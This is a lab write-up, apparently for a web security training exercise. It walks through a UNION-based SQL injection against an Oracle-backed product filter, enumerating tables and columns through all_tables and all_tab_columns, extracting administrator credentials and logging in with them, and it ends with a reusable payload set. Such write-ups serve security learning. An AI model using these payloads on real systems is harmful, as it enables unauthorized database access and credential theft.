# 🧨 1. Observation

---

The vulnerable parameter was:

```sql
category=Gifts

```

When I added a **single quote `'`**, the page exploded into an error. This means:

> The input is being used directly inside an SQL query without sanitization.
> 

From there, I tried a UNION test like:

```sql
Gifts' UNION SELECT NULL,NULL FROM dual--
```

This told me two important things:

1. **It’s Oracle**, because `dual` is an Oracle dummy table.
2. The query likely selects **2 columns**.

Then I tested with:

```sql
Gifts' UNION SELECT NULL,NULL FROM all_tables--
```

And that helped confirm Oracle metadata access.

**Important:** Browsers encode the payload and break shit—so use **Burp**.

---

# 🧠 2. Hypothesis

Based on behavior:

```sql
SELECT * FROM products WHERE category = '<user_input>';
```

A single quote breaks the query → perfect spot for SQLi.

Also, Oracle doesn’t have `information_schema`. Instead it has:

- `all_tables` → list tables
- `all_tab_columns` → list columns
- `dual` → a fake 1‑row table for queries that require FROM


---

# 🧪 3. Testing

## **Test 1 — Confirm Injection**

Payload:

```sql
'
```

Page broke → injection confirmed.

---

## **Test 2 — Check Column Count**

```sql
Gifts' UNION SELECT NULL,NULL FROM dual--

```

Two columns matched. Boom.

---

## **Test 3 — List Tables**

Payload:

```sql
Gifts' UNION SELECT table_name, NULL FROM all_tables--

```

Found the target table:

```sql
USERS_EUKUYL
```

This is the user credential table.

---

## **Test 4 — List Columns**

Payload:

```sql
Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EUKUYL'--

```

Got:

```sql
USERNAME_INSHWY
PASSWORD_KEKXKG
```

Those are your username/password column names.

---

## **Test 5 — Extract Credentials**

Payload:

```sql
Gifts' UNION SELECT USERNAME_INSHWY, PASSWORD_KEKXKG FROM USERS_EUKUYL--
```

Output:

```sql
administrator
ivmo56ozoenkwimgqraf
```

Full win.

Screenshot:

<img width="1194" height="288" alt="image" src="https://github.com/user-attachments/assets/dad936e3-4f9c-4da1-abd3-6781638084ca" />


---

## **Test 6 — Verification**

Logged in normally.

Got:

> "You are logged in as administrator"
> 

You could update email → proof of full access.

---

# 🚀 4. Final Payload Set

### **List tables:**

```sql
Gifts' UNION SELECT table_name, NULL FROM all_tables--
```

### **List columns:**

```sql
Gifts' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_EUKUYL'--
```

### **Extract data:**

```sql
Gifts' UNION SELECT USERNAME_INSHWY, PASSWORD_KEKXKG FROM USERS_EUKUYL--

```

---

# 📘 5. Clear Explanations

### **What is `dual`?**

A bullshit fake table Oracle uses because Oracle requires `FROM` even when selecting static values.

Example:

```
SELECT 'hello' FROM dual;
```

Other DBs don't need this.

### **Why not INFORMATION_SCHEMA?**

Because Oracle lives in its own universe.

Instead you use:

- `all_tables`
- `all_tab_columns`

### **Why did UNION work?**

UNION merges two SELECT statements, but Oracle is strict:

- Same number of columns
- Same datatype in each position

### **Why uppercase table names?**

Oracle stores unquoted identifiers in UPPERCASE. Always use uppercase when enumerating.

### **Why Burp?**

Browser re-encodes characters and ruins payloads.

Burp sends the raw request.

---

# 🧠 6. Learning

- Single quote → instant truth detector for SQLi.
- Oracle metadata comes from dictionary tables, not `information_schema`.
- UNION in Oracle demands datatype compatibility.
- Always enumerate in this order:
    1. Confirm injection
    2. Column count
    3. List tables
    4. List columns
    5. Extract data
    6. Verify
- Oracle SQL syntax is weird but predictable once learned.

---

# 🔮 7. Future Notes (Read These When Your Brain Goes Blank)

1. Oracle doesn’t use `information_schema`.
    
    Use `all_tables`, `all_tab_columns`, `user_tables`, `user_tab_columns`.
    
2. Oracle requires:

```
SELECT 'value' FROM dual;

```

1. String concatenation in Oracle uses:

```
'A' || 'B'

```

1. Comments:
- `-`  (must include space sometimes)
- `/* */`
1. UNION needs matching datatypes.
2. `dual` = 1‑row dummy table Oracle uses for bullshit.
3. Uppercase table/column names unless you see them quoted.

---

# 🔗 8. Useful References (Check These If You Forget Shit)

- PortSwigger SQLi Cheat Sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet
- PentestMonkey Oracle SQLi Cheat Sheet: https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
- General SQLi Sheets: https://www.scribd.com/document/560049559/SQL-injection-cheat-sheet

---
